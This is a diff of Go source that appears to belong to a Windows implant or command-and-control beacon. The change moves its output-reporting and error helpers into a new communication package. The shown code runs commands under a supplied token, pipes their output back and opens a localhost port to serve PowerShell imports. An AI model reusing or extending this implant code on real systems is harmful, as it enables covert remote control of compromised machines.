@@ -8,6 +8,7 @@ import (
 	"errors"
 	"fmt"
 	"golang.org/x/sys/windows"
+	"main/communication"
 	"main/config"
 	"main/crypt"
 	"main/util"
@@ -225,12 +226,12 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 		_ = windows.ReadFile(hRPipe, buf, nil, &read)
 		if read.InternalHigh > 0 {
 			if firstTime {
-				DataProcess(0, buf[:read.InternalHigh])
+				communication.DataProcess(0, buf[:read.InternalHigh])
 				firstTime = false
 			} else {
-				DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
+				communication.DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
 				if lastTime {
-					DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
+					communication.DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
 				}
 			}
 		}
@@ -273,16 +274,16 @@ func PowershellImport(b []byte) ([]byte, error) {
 
 func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
-	port := ReadShort(portByte)
+	port := communication.ReadShort(portByte)
 	go func() {
 		listen, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(port)))
 		if err != nil {
-			ErrorProcess(errors.New("listen failed, err: " + err.Error()))
+			communication.ErrorProcess(errors.New("listen failed, err: " + err.Error()))
 			return
 		}
 		conn, err := listen.Accept()
 		if err != nil {
-			ErrorProcess(errors.New("accept failed, err: " + err.Error()))
+			communication.ErrorProcess(errors.New("accept failed, err: " + err.Error()))
 			return
 		}
 
@@ -294,7 +295,7 @@ func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 		_ = conn.Close()
 		err = listen.Close()
 		if err != nil {
-			ErrorProcess(errors.New("close failed, err: " + err.Error()))
+			communication.ErrorProcess(errors.New("close failed, err: " + err.Error()))
 			return
 		}
 
